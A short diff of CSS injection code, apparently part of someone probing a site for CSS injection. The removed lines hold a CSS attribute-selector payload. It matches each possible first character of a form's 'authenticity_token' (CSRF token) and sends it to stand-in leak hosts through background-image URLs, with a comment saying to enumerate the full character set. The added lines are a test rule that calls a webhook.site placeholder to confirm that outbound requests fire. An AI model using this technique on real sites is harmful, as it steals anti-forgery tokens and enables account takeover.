@@ -1,12 +1,9 @@
-<style>
-input[name="authenticity_token"][value^="a"] {
-  background: url(https://exmaple.com/leak?char=a);
+body {
+  background: red !important;
+  border: 10px solid yellow !important;
 }
-input[name="authenticity_token"][value^="b"] {
-  background: url(https://examle.com/leak?char=b);
+
+/* 测试是否发送请求 */
+body::before {
+  content: url(https://webhook.site/你的唯一ID/css-loaded);
 }
-input[name="authenticity_token"][value^="c"] {
-  background: url(https://example.com/leak?char=c);
-}
-/* 继续枚举 a-z, A-Z, 0-9, +, /, = */
-</style>
